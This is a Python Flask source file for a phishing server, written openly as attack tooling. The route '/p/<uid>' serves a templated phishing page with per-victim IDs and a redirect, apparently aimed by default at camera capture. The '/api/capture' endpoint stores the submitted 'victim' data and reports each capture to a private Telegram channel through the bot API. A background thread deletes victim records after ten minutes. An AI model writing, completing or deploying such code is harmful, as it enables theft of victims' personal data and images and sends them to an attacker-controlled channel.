from flask import Flask, request, jsonify, render_template_string
import json
import time
import os
from config import BOT_TOKEN, PRIVATE_CHANNEL_ID

app = Flask(__name__)

# In-memory storage (clears after 10 min)
victim_data = {}
user_redirects = {}

@app.route('/p/<uid>')
def phishing_page(uid):
    target_type = request.args.get('type', 'cam')
    victim_id = request.args.get('v', 'unknown')
    redirect_url = user_redirects.get(victim_id, 'https://google.com')
    
    with open('web/index.html', 'r') as f:
        html = f.read()
    
    html = html.replace('{{REDIRECT_URL}}', redirect_url)
    html = html.replace('{{VICTIM_ID}}', victim_id)
    html = html.replace('{{TYPE}}', target_type)
    return html

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    victim_id = data.get('victim_id')
    victim_data[victim_id] = data
    victim_data[victim_id]["time"] = time.time()
    
    # Forward to bot (which forwards to user + channel)
    forward_to_bot(data)
    return jsonify({"status": "ok"})

def forward_to_bot(data):
    # Bot will handle forwarding via its own logic
    # We trigger bot via a webhook call or just store data
    # Since bot is running in same process, we can call function directly
    # But bot is in separate thread, so we use API call
    try:
        import requests
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
            "chat_id": PRIVATE_CHANNEL_ID,
            "text": f"📥 New data from {data.get('victim_id')}",
            "parse_mode": "Markdown"
        }, timeout=5)
    except:
        pass

# Auto-delete old data after 10 min
import threading
def clean_old_data():
    while True:
        time.sleep(600)
        current_time = time.time()
        to_delete = []
        for key, val in victim_data.items():
            if current_time - val.get("time", 0) > 600:
                to_delete.append(key)
        for key in to_delete:
            del victim_data[key]
        print(f"🧹 Deleted {len(to_delete)} old victim data")

threading.Thread(target=clean_old_data, daemon=True).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
